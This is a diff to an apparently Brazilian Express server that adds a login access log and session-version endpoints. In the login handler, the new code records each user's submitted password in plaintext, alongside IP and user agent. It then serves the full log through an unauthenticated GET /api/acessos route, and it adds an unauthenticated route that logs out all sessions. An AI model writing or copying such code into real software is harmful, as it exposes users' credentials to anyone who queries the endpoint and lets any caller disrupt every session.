@@ -52,6 +52,8 @@ const DATA_FILE     = path.join(DATA_DIR, 'data.json');
 const FISCAL_FILE   = path.join(DATA_DIR, 'fiscal-notas.json');
 const NOTIF_HIST_FILE = path.join(DATA_DIR, 'notificacoes.json');
 const BLING_FILE    = path.join(DATA_DIR, 'bling-tokens.json');
+const ACESSOS_FILE  = path.join(DATA_DIR, 'acessos-log.json');
+const SESSAO_FILE   = path.join(DATA_DIR, 'sessao.json');
 const BACKUP_DIR    = path.join(DATA_DIR, 'backups');
 const USA_VOLUME    = DATA_DIR === '/data'; // true = volume persistente Railway
 
@@ -192,6 +194,31 @@ function loadBlingTokens() {
 }
 function saveBlingTokens(tokens) {
   fs.writeFileSync(BLING_FILE, JSON.stringify(tokens, null, 2));
+}
+
+// Log de acessos e versão de sessão ficam em arquivos próprios (mesmo motivo do
+// bling-tokens.json acima): login acontece com frequência e concorrência, e um
+// saveData() de outra rotina em andamento sobrescreveria essas mudanças se elas
+// vivessem dentro de data.json.
+const MAX_ACESSOS_LOG = 300;
+function loadAcessosLog() {
+  try { return JSON.parse(fs.readFileSync(ACESSOS_FILE, 'utf8')); } catch { return []; }
+}
+function saveAcessosLog(log) {
+  fs.writeFileSync(ACESSOS_FILE, JSON.stringify(log, null, 2));
+}
+function registrarAcesso({ nome, senha, painel, ip, userAgent }) {
+  const log = loadAcessosLog();
+  log.push({ data: new Date().toISOString(), nome, senha: String(senha), painel, ip, userAgent: userAgent || '' });
+  if (log.length > MAX_ACESSOS_LOG) log.splice(0, log.length - MAX_ACESSOS_LOG);
+  saveAcessosLog(log);
+}
+
+function loadSessao() {
+  try { return JSON.parse(fs.readFileSync(SESSAO_FILE, 'utf8')); } catch { return { version: 0 }; }
+}
+function saveSessao(sessao) {
+  fs.writeFileSync(SESSAO_FILE, JSON.stringify(sessao, null, 2));
 }
 // Migração única: se ainda não existe bling-tokens.json, importa de dentro do data.json antigo
 function migrarBlingTokensSeNecessario() {
@@ -528,15 +555,32 @@ app.post('/api/login', (req, res) => {
   if (usuario.ativo === false) {
     return res.status(403).json({ error: 'desativado', painel: usuario.painel });
   }
+  registrarAcesso({ nome: usuario.nome, senha, painel: usuario.painel, ip: req.ip, userAgent: req.headers['user-agent'] });
+  const sessionVersion = loadSessao().version || 0;
   if (usuario.painel === 'fornecedor') {
-    return res.json({ ok: true, nome: usuario.nome, abas: [], painel: 'fornecedor' });
+    return res.json({ ok: true, nome: usuario.nome, abas: [], painel: 'fornecedor', sessionVersion });
   }
   if (usuario.painel === 'legado') {
-    return res.json({ ok: true, nome: usuario.nome, abas: usuario.abas || [], painel: 'legado' });
+    return res.json({ ok: true, nome: usuario.nome, abas: usuario.abas || [], painel: 'legado', sessionVersion });
   }
   const APP_TABS = new Set(['ads','lucro','promocoes','contas-pagar','contas-receber','bling','fiscal','compras','calculadora','configuracoes']);
   const painel = (usuario.painel === 'app' || (usuario.abas || []).some(t => APP_TABS.has(t))) ? 'app' : 'painel2';
-  res.json({ ok: true, nome: usuario.nome, abas: usuario.abas || [], painel });
+  res.json({ ok: true, nome: usuario.nome, abas: usuario.abas || [], painel, sessionVersion });
+});
+
+app.get('/api/acessos', (req, res) => {
+  res.json(loadAcessosLog().slice().reverse());
+});
+
+app.get('/api/sessao/versao', (req, res) => {
+  res.json({ version: loadSessao().version || 0 });
+});
+
+app.post('/api/sessao/derrubar-todos', (req, res) => {
+  const sessao = loadSessao();
+  sessao.version = (sessao.version || 0) + 1;
+  saveSessao(sessao);
+  res.json({ ok: true, version: sessao.version });
 });
 
 app.get('/api/usuarios', (req, res) => {
